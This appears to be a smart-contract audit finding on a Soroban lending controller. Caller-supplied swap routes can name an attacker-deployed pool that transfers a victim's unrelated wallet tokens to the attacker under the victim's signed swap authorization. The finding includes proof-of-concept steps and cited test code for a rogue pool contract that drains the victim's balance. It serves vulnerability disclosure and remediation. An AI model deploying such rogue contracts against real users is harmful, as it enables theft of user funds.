### Title
Attacker-controlled swap routes can steal unrelated caller wallet tokens through the caller’s authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
Controller strategy routes are user-controlled opaque byte strings, and the controller submits them to the configured router under the account owner’s authorized `swap_collateral`, `swap_debt`, `multiply`, or `repay_debt_with_collateral` call. [1](#0-0) [2](#0-1)  A malicious route pool can execute a token transfer from the signed caller to an attacker, unrelated to the controller’s routed input token. [3](#0-2) [4](#0-3) 

### Finding Description
The vulnerable boundary is the same class as the fixture-name traversal: an attacker-controlled identifier is used to select an execution target outside the intended safe set. `swap_collateral` requires the caller’s authorization and account ownership, then passes the caller-provided `swap` payload to `withdraw_and_swap_from_supply`. [5](#0-4) [6](#0-5)  `swap_tokens` only measures the controller’s input spend and output receipt; it does not constrain which contracts the route invokes or which nested authorizations those contracts request. [7](#0-6) 

The packed route format stores an arbitrary pool address index for each hop rather than an allowlisted market or protocol-controlled address. [8](#0-7) [9](#0-8)  Consequently, a route can name an attacker-deployed contract as the pool, and that contract can perform a `token.transfer(victim, attacker, amount)` while the victim’s authorization for the enclosing controller operation is active. [10](#0-9) [3](#0-2) 

The regression test demonstrates that Soroban records this malicious transfer as a child of the victim’s `swap_collateral` authorization and that enforcing mode accepts it if the victim signs that tree. [11](#0-10) [12](#0-11) 

### Impact Explanation
An unprivileged attacker can steal arbitrary token balances from a user who signs a malicious controller-strategy transaction, including tokens unrelated to the supplied collateral, borrowed debt, or router output. [13](#0-12) [4](#0-3)  This is theft of user funds, not merely poor route execution, because the stolen asset never participates in the measured controller input/output settlement. [7](#0-6) 

### Likelihood Explanation
The attacker must induce the victim to submit a malicious route and sign an authorization tree containing the unexpected token-transfer child. [11](#0-10) [14](#0-13)  The exploit can still return a fair swap output and pass the controller’s measured settlement and final risk checks, so the transaction can appear successful apart from the extra signed child authorization. [15](#0-14) [16](#0-15) 

### Recommendation
Constrain route execution to protocol-approved venue implementations or otherwise prevent nested calls beneath `execute_strategy` from resolving caller-controlled pool addresses to arbitrary contracts. [9](#0-8) [17](#0-16)  At minimum, the controller-facing route format should carry independently validated venue identities, and clients must reject any signed authorization tree containing children beyond the expected exact input-token transfer. [18](#0-17) 

### Proof of Concept
1. The victim owns a controller account with supplied USDC and holds an unrelated wallet token. [19](#0-18) 
2. The attacker deploys a rogue pool configured with `(victim, wallet_token, attacker, amount)` and places its address in the swap route’s pool field. [20](#0-19) [13](#0-12) 
3. The victim calls `swap_collateral(caller=victim, account_id=victim_account, current=USDC, amount=50_000_000_000, new=ETH, swap=malicious_route)`. [21](#0-20) 
4. During router execution, the route invokes the rogue pool, which calls `wallet_token.transfer(victim, attacker, amount)`. [10](#0-9) [3](#0-2) 
5. The simulated authorization records that token transfer as a child of the victim’s controller `swap_collateral` authorization, and once signed, the victim’s full wallet balance moves to the attacker while the account still receives the expected ETH collateral. [22](#0-21)

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-65)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L67-76)
```rust
    let deposit_assets = vec![env, (new.clone(), swapped_amount)];
    supply::process_deposit(
        env,
        &env.current_contract_address(),
        &mut account,
        &deposit_assets,
        &mut cache,
    );

    strategy_finalize(env, account_id, &mut account, &mut cache);
```

**File:** contracts/controller/src/strategies/swap.rs (L29-54)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-46)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L55-70)
```rust
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L83-100)
```rust
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-124)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L134-157)
```rust
    fn swap_args(&self, route: &Bytes) -> Vec<Val> {
        let (usdc, eth) = self.assets();
        (
            self.alice.clone(),
            self.account_id,
            usdc,
            SWAP_IN_USDC,
            eth,
            route.clone(),
        )
            .into_val(&self.t.env)
    }

    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L166-182)
```rust
    /// Enforcing mode: Alice signs `swap_collateral` with exactly `children` beneath it.
    fn try_swap_with_signed_tree(
        &self,
        route: &Bytes,
        children: &[MockAuthInvoke],
    ) -> Result<(), soroban_sdk::Error> {
        let root = MockAuthInvoke {
            contract: &self.t.controller,
            fn_name: "swap_collateral",
            args: self.swap_args(route),
            sub_invokes: children,
        };
        self.t.env.mock_auths(&[MockAuth {
            address: &self.alice,
            invoke: &root,
        }]);
        self.try_swap(route)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L199-226)
```rust
    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** contracts/controller/src/risk/validation.rs (L12-16)
```rust
/// Authenticates `caller` and rejects execution during a flash loan.
pub(crate) fn require_authorized_caller(env: &Env, caller: &Address) {
    caller.require_auth();
    require_not_flash_loaning(env);
}
```

**File:** contracts/swap-aggregator/src/program.rs (L17-24)
```rust
//! instructions (5 * op_count bytes)
//!   [0]      opcode      -> Opcode
//!   [1]      mode        -> Mode
//!   [2]      idx_a       pool
//!   [3]      idx_b       token_in  | lp share token
//!   [4]      idx_c       token_out | amounts index
//! weights (3 * weight_count bytes)
//!   u24 big-endian parts-per-million, each in 1..=PPM_DENOMINATOR
```

**File:** contracts/swap-aggregator/src/program.rs (L58-68)
```rust
/// Byte offsets within one instruction record.
mod field {
    pub(super) const OPCODE: usize = 0;
    pub(super) const MODE: usize = 1;
    /// Pool address index.
    pub(super) const POOL: usize = 2;
    /// Input token index, or the LP share token for a liquidity leg.
    pub(super) const TOKEN_IN: usize = 3;
    /// Output token index, or an `amounts` index for a liquidity leg.
    pub(super) const TOKEN_OUT: usize = 4;
}
```
